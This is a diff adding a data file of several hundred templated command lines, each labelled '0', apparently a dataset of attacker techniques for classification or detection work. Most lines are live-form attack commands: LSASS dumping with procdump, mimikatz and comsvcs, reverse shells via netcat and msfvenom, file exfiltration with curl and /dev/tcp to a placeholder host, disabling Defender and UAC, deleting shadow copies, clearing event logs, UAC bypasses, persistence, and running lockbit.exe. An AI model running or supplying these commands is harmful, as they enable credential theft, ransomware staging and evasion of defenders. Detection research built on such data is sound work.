@@ -1,0 +1,325 @@
+0	net.exe stop ${service_name} && sc.exe config ${service_name} start=disabled
+0	cmd.exe /c "taskkill.exe /f /im ${process_name}"
+0	Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_to_execute}' -ParentId ${parent_pid}
+0	psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}
+0	SharpRDP.exe computername=${ip_address} command=${command_to_execute} username=${domain}\${username} password=${password}
+0	psexec.exe \\${ip_address} -s ${command_to_execute}
+0	cmd.exe /c "lockbit.exe -pass ${password}"
+0	mstsc /v:${computer_name} /f
+0	compress ${source_file_path}
+0	wevtutil cl system
+0	plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
+0	powershell -c "choco install -y putty"
+0	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	quser /SERVER:${computer_name}
+0	msfvenom -p windows/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	sc stop WinDefend && sc config WinDefend start=disabled
+0	tar -zcvf archive.tar.gz ${source_directory}
+0	SharpRDP.exe computername=${ip_address} command="${command_to_execute}" username=${domain}\${username} password=${password}
+0	nc -l ${ip_address} ${port}
+0	pscp ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+0	reg add "HKLM\SOFTWARE\Microsoft\Security Center" /v UACDisableNotify /t REG_DWORD /d 1 /f
+0	curl -X POST -d "@${source_file_path}" http://${ip_address}:${port}/upload
+0	cat email.txt | mpack -s ${email_subject} ${username}@${domain}
+0	mstsc /v:${computer_name} /f
+0	powershell -c "wmic.exe shadowcopy delete"
+0	mstsc /v:${ip_address}
+0	cat email.txt | sendmail ${username}@${domain}
+0	sftp  ${username}@${ip_address}:${source_file_path} ${destination_file_path}
+0	zip -q archive.zip ${source_file_path}
+0	choco install -y 7zip
+0	xcopy ${source_directory} \\${ip_address}\${destination_directory} /s /e
+0	powershell -c "echo y | plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+0	.\VGAuthService.exe ${VGAuthService.dll_path},VoidFunc
+0	New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force; Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "${command_to_execute}" -Force
+0	scp ${username}@${ip_address}:${destination_file_path} ${source_file_path}
+0	red add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
+0	cat ${source_file_path} > /dev/tcp/${ip_address}/${port}
+0	reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v 1 /d "${command_to_execute}"
+0	scp -r ${source_directory} ${username}@${ip_address}:${destination_directory}
+0	scp ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+0	"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+0	procdump -accepteula -mm lsass.exe lsassdump.dmp
+0	cmd.exe /c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
+0	schtasks /create /ru system /sc daily /tr "${command_to_execute}" /tn win32times /f
+0	ssmtp ${username}@${domain} < mail.txt
+0	get-localgroupmember -group Users
+0	zip -r archive.zip ${source_directory}
+0	net users
+0	ncat ${ip_address} ${port} -e sh
+0	wmic useraccount get /ALL
+0	powershell -c  "procdump -ma lsass.exe lsassdump.dmp"
+0	cmd.exe /c "bitsadmin.exe /transfer download /Priority HIGH ${source_file_path} ${destination_file_path}"
+0	reg SAVE HKLM\SYSTYEM ${local_file_path}
+0	rsync -avz ${source_file_path} ${destination_file_path}
+0	cmd.exe /c "cipher.exe /w:C:"
+0	zip -m archive.zip ${source_file_path}
+0	wmic.exe shadowcopy delete
+0	CertReq -Post -config ${destination_file_path} ${source_file_path}
+0	Copy-Item ${source_file_path} -Destination ${destination_file_path}
+0	psexec \\${ip_address} -i ${command_to_execute}
+0	sc create win32times binPath="${command_to_execute}"
+0	psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s
+0	powershell -c "${command_to_execute}" > ${local_file_path}
+0	powershell.exe -EncodedCommand [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("${command_to_execute}"))
+0	7z a archive.7z ${source_file_path}
+0	powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
+0	powershell -c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+0	powershell -c "vssadmin.exe delete shadows /all /quiet"
+0	cmd.exe /c "net use \\${computer_name}\${destination_file_path} ${password} /u:${username}"
+0	curl ${source_file_path} -o $ ${destination_file_path}
+0	rsync -r ${source_directory} ${username}@${ip_address}:${destination_directory}
+0	curl -X POST http://${ip_address}/upload -H -F "files=@${source_file_path}"
+0	mstsc /v:${ip_address}
+0	zip archive.zip ${source_file_path}
+0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v ${value_name} /t REG_DWORD /d ${value}
+0	Remove-Item -Path ${local_directory_path} -Recurse
+0	cat email.txt | mutt -s ${email_subject} ${username}@${domain}
+0	copy ${source_file_path} \\${ip_address}\${destination_file_path}
+0	7z a ${destination_file_path} ${source_file_path} -p${password}
+0	psexec \\${ip_address} -u ${username} -p ${password} script.txt
+0	nc -vn ${ip_address} ${port} < ${source_file_path}
+0	red add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
+0	curl -X POST --upload-file ${source_file_path} http://${ip_address}:${port}/upload
+0	cat ${source_file_path} | nc -vn ${ip_address} ${port}
+0	plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+0	net use \\${computer_name}\${destination_file_path} ${password} /u:${username}
+0	powershell -c "vssadmin create shadow /for=C:"
+0	whoami
+0	xcopy ${source_directory} ${destination_directory} /s /e
+0	quser /server:${computer_name}
+0	scp -r ${source_directory} ${username}@${ip_address}:${destination_directory}
+0	wmic /node:"${ip_address}" process call create "cmd.exe /c esentutl.exe /y /vss ${source_file_path} /d ${destination_file_path}"
+0	zip -e archive.zip ${source_file_path}
+0	Add-MpPreference -ExclusionProcess "${excluded}"
+0	PPID-Spoof -ppid ${parent_pid} -spawnto "${command_to_execute}" -dllpath "${dll_path}"
+0	quser ${username}
+0	sekurlsa::logonPasswords
+0	qwinsta.exe /server:${computer_name}
+0	rclone.exe copy C:\Users\Public\collect.7z ${account}:backup
+0	mstsc /v:${computer_name}
+0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v ${value_name} /t REG_DWORD /d ${value}
+0	scp ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+0	rm -rf ${local_directory_path}
+0	Compress-Archive -Path ${source_file_path} -DestinationPath ${destination_file_path} -Force
+0	[System.Environment]::UserName
+0	Start-BitsTransfer -Source ${source_file_path} -Destination ${destination_file_path} -Asynchronous
+0	reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+0	Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force
+0	mstsc /v:${computer_name}
+0	net user /domain
+0	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt
+0	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f elf -o reverse.elf
+0	pscp ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+0	procdump -ma lsass.exe lsassdump.dmp
+0	cmd.exe /c "echo ${email_content} | mail -s ${email_subject} ${username}@${domain}"
+0	cmd.exe /c "choco install -y putty"
+0	cscript "${jscript}"
+0	cmd.exe /c "choco install 7zip"
+0	rmdir /s /q ${local_directory_path}
+0	New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force; New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force; Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "${command_to_execute}" -Force
+0	qwinsta.exe
+0	wmic /node:"${ip_address}" shadowcopy call create Volume=C:
+0	rsync ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+0	qwinsta.exe ${username}
+0	choco install -y putty
+0	Copy-Item ${source_directory} -Destination ${destination_directory} -Recurse
+0	rsync ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+0	7z a archive.zip ${source_file_path}
+0	sc.exe create ${service_name} binPath="${command_to_execute}"
+0	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d "${command_to_execute}" /f
+0	7z a archive.7z ${source_file_path} -p${password}
+0	cat ${source_file_path} | telnet ${ip_address} ${port}
+0	Start-ATHProcessUnderSpecificParent  -ParentId ${parent_pid} -TestGuid ${test_guid}
+0	assoc ${extension_to_change}=${target_extension_handler}
+0	7z a archive.zip ${source_file_path} -p${password}
+0	cat ${source_file_path} | socat - TCP:${ip_address}:${port}
+0	New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force; New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force; Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "${command_to_execute}" -Force
+0	reg add hkcu\software\classes\ms-settings\shell\open\command /ve /d "${command_to_execute}" /f && reg add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+0	powershell -c "mstsc /v:${ip_address} /f"
+0	wevtutil cl security
+0	cat ${source_file_path} | nc ${ip_address} ${port}
+0	powershell -c "curl ${source_file_path} -o $ ${destination_file_path}"
+0	powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s"
+0	curl -X POST -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
+0	scp ${username}@${ip_address}:${source_file_path} ${destination_file_path}
+0	powershell -c "taskkill.exe /f /im ${process_name}"
+0	net localgroup "Administrators"
+0	nc ${ip_address} ${port} -e sh
+0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ${value_name} /t REG_DWORD /d ${value}
+0	Get-EventLog -List | ForEach-Object {$_.Log} | ForEach-Object {Clear-EventLog -LogName $_ }
+0	7z a archive.7z ${source_directory}
+0	pypykatz live lsa
+0	msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force
+0	powershell -c "net.exe stop ${service_name}"
+0	wget https://${ip_address}/${destination_file_path}
+0	mimikatz.exe "sekurlsa::minidump lsassdump.dmp" "sekurlsa::logonpasswords full" exit
+0	reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "rundll32.exe ${VGAuthService.dll_path},VoidFunc" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "rundll32.exe ${VGAuthService.dll_path},VoidFunc" /f
+0	echo Username: %USERNAME%
+0	cat ${source_file_path} | ssh ${username}@${ip_address} 'cat > ${destination_file_path}'
+0	copy ${shadow_copy_path}\windows\ntds\ntds.dit ${local_file_path}
+0	msfvenom -p linux/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f elf -o reverse.elf
+0	xcopy ${source_file_path} \\${ip_address}\${destination_file_path} /Y
+0	akagi32 23 ${command_to_execute}
+0	rundll32.exe ${dll_file},${entry_point}
+0	schtasks /create /ru system /sc daily /tr "${command_to_execute}" /tn win32times /f
+0	psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}
+0	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	gpg.exe -c ${source_file_path}
+0	cmd.exe /c "choco install -y 7zip"
+0	bitsadmin.exe /transfer download /Priority HIGH ${source_file_path} ${destination_file_path}
+0	sc.exe start ${service_name}
+0	get-localgroup
+0	sekurlsa::minidump lsassdump.dmp
+0	powershell -c "choco install -y 7zip"
+0	rsync -r ${username}@${ip_address}:${source_directory} ${destination_directory}
+0	powershell -c "copy ${source_file_path} ${destination_file_path}"
+0	fltmc.exe unload ${sysmon_driver}
+0	vssadmin.exe delete shadows /all /quiet
+0	wbadmin delete catalog -quiet
+0	cmd.exe /c "${command_to_execute}"
+0	psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s
+0	Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
+0	powershell -c "echo ${email_content} | mail -s ${email_subject} ${username}@${domain}"
+0	cscript "${jscript}" > ${local_file_path}
+0	plink ${username}@${ip_address}
+0	schtasks /create /tn win32times /sc onstart /ru system /tr "${command_to_execute}"
+0	sekurlsa::logonpasswords ful
+0	powershell -c "cipher.exe /w:C:"
+0	New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value "${command_to_execute}"; New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
+0	Start-Process -FilePath ${parent_path} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine "${command_to_execute}"
+0	echo ${email_content} | sendmail ${username}@${domain}
+0	cmdkey /list
+0	ncat.exe ${ip_address} ${port} -e sh
+0	robocopy ${source_directory} ${destination_directory} /e
+0	lazagne.exe windows -mscache
+0	telnet ${ip_address} ${port} < ${source_file_path}
+0	cmd.exe /c "choco install putty"
+0	mstsc /v:${ip_address} /f
+0	nanodump.x64.exe -w lsassdump.dmp
+0	tar -cvf archive.tar ${source_directory}
+0	cmd.exe /c "plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+0	cp -r ${source_directory} ${destination_directory}
+0	Copy-Item "${local_file_path}" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
+0	7z a -p${password} ${destination_file_path} ${source_file_path}
+0	powershell -c "SharpRDP.exe computername=${ip_address} command=${command_to_execute} username=${domain}\\${username} password=${password}"
+0	cmd.exe /c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+0	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f jsp -o reverse.jsp
+0	7z a archive.7z ${source_directory} -p${password}
+0	sc.exe stop ${service_name}
+0	cat email.txt | ssmtp ${username}@${domain}
+0	lockbit.exe -pass ${password}
+0	dir ${source_file_path} -Recurse | Compress-Archive -DestinationPath ${destination_file_path}
+0	powershell -c "${command_to_execute}"
+0	wevtutil cl application
+0	Add-MpPreference -ExclusionExtension ""${excluded}"
+0	Invoke-Mimikatz -DumpCreds
+0	powershell -c "choco install 7zip"
+0	reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v ${value_name} /t REG_DWORD /f /d ${value}
+0	cmd.exe /c "sc.exe stop ${service_name}"
+0	msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	xcopy ${source_file_path} \\${ip_address}\${destination_file_path}
+0	cp ${source_file_path} ${destination_file_path}
+0	taskkill.exe /f /im ${process_name}
+0	nc -c sh ${ip_address} ${port}
+0	socat - TCP:${ip_address}:${port} < ${source_file_path}
+0	echo -e ${email_content} | ssmtp ${username}@${domain}
+0	rundll32.exe comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsassdump.dmp full
+0	Add-MpPreference -ExclusionPath "${excluded}"
+0	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt
+0	robocopy ${source_file_path} ${destination_file_path} /mir
+0	Stop-Service -Name ${service_name}; Remove-Service -Name ${service_name}
+0	cmd /c "certutil -urlcache -split -f ${source_file_path} ${destination_file_path}"
+0	powershell -c "bitsadmin.exe /transfer download /Priority HIGH ${source_file_path} ${destination_file_path}"
+0	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	choco install putty
+0	nanodump.x64.exe --silent-process-exit lsassdump.dmp
+0	reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v ${value_name} /t REG_DWORD /f /d ${value}
+0	PsExec64.exe \\${ip_address} -s ${command_to_execute}
+0	vssadmin create shadow /for=C:
+0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v ${value_name} /t REG_DWORD /d ${value}
+0	openssl enc -pbkdf2 -in ${source_file_path} -out ${destination_file_path}
+0	akagi64 61 ${command_to_execute}
+0	powershell -c "Copy-Item ${source_file_path} -Destination ${destination_file_path}"
+0	Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
+0	cmd.exe /c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s"
+0	net localgroup
+0	cmd.exe /c "whoami"
+0	cmd.exe /c "gpg.exe -c ${source_file_path}"
+0	xcopy ${source_file_path} ${destination_file_path}
+0	rm -f ${local_file_path}
+0	Copy-Item "${local_file_path}" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+0	sendmail ${username}@${domain} < mail.txt
+0	cmd.exe /c "net.exe stop ${service_name}"
+0	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain}
+0	cmd.exe /c "SharpRDP.exe computername=${ip_address} command=${command_to_execute} username=${domain}\\${username} password=${password}"
+0	powershell -c "sc.exe stop ${service_name}"
+0	query user
+0	copy ${source_file_path} ${destination_file_path}
+0	ntdsutil "ac i ntds" "ifm" "create full ${local_file_path}" q q
+0	wevtutil cl ${log_name}
+0	powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
+0	zip -er archive.zip ${source_directory}
+0	psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}
+0	powershell -c "xcopy ${source_directory} \\${ip_address}\${destination_directory} /s /e"
+0	wscript "${jscript}"
+0	msfvenom -p cmd/unix/reverse_bash HOST=${ip_address} LPORT=${port} -f raw -o reverse.sh
+0	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	Copy-Item ${source_directory} -Destination "\\${ip_address}\C$\${destination_directory}" -Recurse
+0	msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	red add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "${command_to_execute}"
+0	mail -s ${email_subject} ${username}@${domain} < mail.txt
+0	telnet ${ip_address} ${port}
+0	powershell -c "PsExec64.exe \\${ip_address} -s ${command_to_execute}"
+0	Remove-Item -path ${local_file_path}
+0	tar -cvzf archive.tar.gz ${source_directory}
+0	net.exe stop ${service_name}
+0	tar -cvfW archive.tar ${source_directory}
+0	wget --post-file=${source_file_path} ${ip_address}:${port}
+0	wmic group get name
+0	sc create win32times binPath= "${command_to_execute}"
+0	net group "domain admins" /domain
+0	curl -Ns telnet://${ip_address}:${port}
+0	quser
+0	cmd.exe /c "curl ${source_file_path} -o $ ${destination_file_path}"
+0	echo ${email_content} | mail -s ${email_subject} ${username}@${domain}
+0	[System.Security.Principal.WindowsIdentity]::GetCurrent()
+0	del /f ${local_file_path}
+0	echo y | plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+0	$env:UserName
+0	cipher.exe /w:C:
+0	sftp ${username}@${ip_address}:${destination_file_path} <<< $"put ${source_file_path}"
+0	echo User Domain: %USERDOMAIN%
+0	rsync -avz ${source_file_path} ${destination_file_path}
+0	wbadmin delete systemstatebackup -keepVersions:0
+0	schtasks /create /tn win32times /sc onlogon /tr "${command_to_execute}"
+0	procdump -accepteula -ma lsass.exe lsassdump.dmp
+0	reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
+0	rundll32.exe comsvcs.dll MiniDump (Get-Process lsass).id  lsassdump.dmp full
+0	7z a -p${password} -mhe=on ${destination_file_path} ${source_file_path}
+0	plink -ssh ${ip_address} -l ${username} -pw ${password}
+0	powershell -c "lockbit.exe -pass ${password}"
+0	wmic shadowcopy call create Volume=C:
+0	nc.exe ${ip_address} ${port} -e sh
+0	rcat connect -s sh ${ip_address} ${port}
+0	powershell -c "plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+0	Get-LocalGroupMember -Name "Administrators"
+0	powershell -c  "rundll32.exe comsvcs.dll MiniDump (Get-Process lsass).id  lsassdump.dmp full"
+0	scp ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+0	qwinsta.exe /SERVER:${computer_name}
+0	cmd.exe /c "${command_to_execute}" > ${local_file_path}
+0	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain}
+0	(gwmi -list win32_shadowcopy).Create("C:","ClientAccessible")
+0	choco install 7zip
+0	powershell -c "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+0	Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name "powershell" -Value "${command_to_execute}"
+0	wscript "${jscript}" > ${local_file_path}
+0	mstsc /v:${ip_address} /f
+0	powershell -c "gpg.exe -c ${source_file_path}"
+0	rar a archive.rar ${source_directory}
+0	Set-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"  -Name "Atomic Red Team" -Value "${command_to_execute}"
+0	net user victim /domain
+0	Start-BitsTransfer -Source ${source_file_path} -Destination ${destination_file_path}
+0	msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	cmd.exe /c "echo y | plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
